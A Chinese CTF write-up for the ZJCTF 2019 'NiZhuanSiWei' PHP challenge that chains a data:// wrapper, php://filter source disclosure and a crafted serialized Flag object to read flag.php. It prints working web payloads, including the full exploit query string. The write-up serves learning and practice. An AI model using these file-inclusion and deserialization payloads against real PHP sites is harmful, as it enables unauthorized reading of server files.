## 基本信息

* 题目名称： [ZJCTF 2019]NiZhuanSiWei
* 题目链接： https://www.nssctf.cn/problem/22
* 考点清单： 反序列化，PHP伪协议,文件包含
* 工具清单： PHP环境,hackbar
* payloads：反序列化

## 一、看到什么

**题目关键信息列表**：

1. `PHP 源代码`: 该题的`PHP`源码，本题的唯一线索。


## 二、想到什么解题思路

1. 源码审计：

   - 我们首先要进入到`if true`里面。
   - 进入之后还不能通过结构块里面的第一个`if`得到结果，它会结束脚本。在不匹配到`flag`的情况下才能进入到`else`中,给了一个`include`，涉及到伪协议
   - 出现了`unserialize()`，还要用到反序列化的知识，所以估计得进入到`useless.php`中查看相关的类。

## 三、尝试过程和结果记录

**代码解读：**

- `if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))`，按照题目的意思，设置`$text`。
    - `file_get_contents`函数用于将整个文件读入一个字符串。`file_get_contents()` 函数除了可以打开文件，还可以打开其他类型的资源，例如`URL`地址、网络套接字`Socket`、`php://input`等。
    - `data://`是一种特殊的数据协议，用于在`PHP`中将数据作为`URL`来访问。它允许将数据作为字符串嵌入到`PHP`代码中，或者将数据作为`URL`参数传递。
所以这里需要通过伪协议进行绕过。

    
- `if(preg_match("/flag/",$file))`,这里的`flag`是被过滤掉的，然后题目也提示说不是这个时候，我们不能直接`include (flag.php)`，需要往下看。

- `include($file);  //useless.php `，很明显的提示，让我们进入到`useless.php`中进行查看。使用`php://filter`协议来访问`useless.php`，同时需要对结果进行base64解码。

- 解码后得到的结果可以看出是反序列化的考点。`__tostring()`触发条件就是当一个对象被当作`str`处理 时，例如在`echo`中被用,`index.php`文件中就有`echo`命令。

- 这个`__tostring()`里面的内容包含`file_get_contents()`，并提示结果在`flag.php`，所以直接去读`flag.php`即可。

**尝试过程：**

1. 设置`data://`协议来满足第一个`if`条件。

    ```
    data://协议
    需要allow_url_fopen,allow_url_include均为on

    这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。常用代码如下：

    http://127.0.0.1/include.php?file=data://text/plain,XXXXX

    text/plain，表示的是文本

    text/plain;base64, 若纯文本没用可用base64编码

    ```
    这里选择纯文本模式`text=data://text/plain,welcome to the zjctf`即可进入if条件中。

2. 使用`php://filter`协议来访问`useless.php`。直接访问`useless.php`是不行的，所以这里使用伪协议进行访问。这个协议一般用来查看源码。

    ```
    一般用法如下

    www.xxx.xxx/?file=php://filter/convert.base64-encode/resource==index.php

    出来的是base64码需要进行解码

    此协议不受allow_url_fopen,allow_url_include配置影响

    ```
    
    这里构造payload,`file=php://filter/convert.base64-encode/resource=useless.php`,可得到`base64`编码的字符串。

    ```
    PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=
    ```
3. 通过任一类型的`base64`解码工具即可得到源码，这里提示了`flag.php`，所以目标就是该文件。同时它提供了 `__tostring()`方法，在其作为对象被当作字符串处理时就会触发，在`index.php`中就设置了`echo`指令进行打印输出，所以这个方法会触发。同时它也给了`file_get_contents()`,则直接填入`flag.php`即可。

    ```php
    <?php  

    class Flag{  //flag.php  
        public $file;  
        public function __tostring(){  
            if(isset($this->file)){  
                echo file_get_contents($this->file); 
                echo "<br>";
            return ("U R SO CLOSE !///COME ON PLZ");
            }  
        }  
    }  
    ?>  
    ```
4. 进行序列化，将`file`值设置为`file=flag.php`,进行序列化，即可得到序列化字符串。
    ```php
    $a = new Flag();
    $a->file = 'flag.php';
    echo serialize($a);//O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
    ```
5. 构造完整`payload`，这里要注意的是，关于`useless.php`部分的`payload`发生了更改。它不使用伪协议。伪协议是读取文件内容的，而这里需要加载并执行该文件。
    ```
    ?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
    ```

6. 但是我们依然没有得到最终结果，它提示结果已经很接近了，然后我们查看源码，得到了最终的`flag`。

    ![](images/[ZJCTF%202019]NiZhuanSiWei-payloads.png)

## 四、总结与反思

1. `php`中引发文件包含漏洞的通常是以下四个函数：
    - `Require`
    - `Require_once`
    - `Include`
    - `include_once`
当利用这四个函数来包含文件时，不管文件是什么类型（图片、`txt`等等），都会直接作为`php`文件进行解析。比较常见的还有这些函数：`highlight_file()`、`show_source()`、`readfile()`、`file_get_contents()`、`fopen()`、`file()`

2. `include()`加载文件
    - `include(useless.php)`是标准的文件包含方式，文件中的`PHP`代码会被执行。
    - `include(php://filter/convert.base64-encode/resource=useless.php)` 使用了`PHP`的特殊流`php://filter，将 useless.php`文件的内容`Base64`编码输出，而不是执行代码。它通常用于绕过安全措施、查看文件内容、或测试文件内容而不直接执行。

